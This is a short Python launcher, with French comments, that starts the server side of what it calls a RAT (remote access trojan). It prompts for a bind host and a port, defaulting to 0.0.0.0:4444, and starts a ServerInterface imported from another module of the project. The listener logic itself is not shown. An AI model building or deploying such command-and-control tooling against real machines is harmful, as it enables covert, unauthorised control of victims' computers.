"""
Script de lancement du serveur RAT depuis la racine
Usage: python run_server.py
"""

import sys
import os

# s'assure qu'on est dans le bon dossier
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# import et lancement
from server.main import ServerInterface

def main():
    print("=== RAT Server Launcher ===")
    
    # options de lancement
    host = input("Host to bind [0.0.0.0]: ").strip() or "0.0.0.0"
    port_input = input("Port to bind [4444]: ").strip() or "4444"
    
    try:
        port = int(port_input)
    except ValueError:
        print("[-] Port invalide, utilisation du port 4444")
        port = 4444
    
    print(f"[*] Starting server on {host}:{port}")
    
    interface = ServerInterface()
    interface.start(host, port)

if __name__ == "__main__":
    main()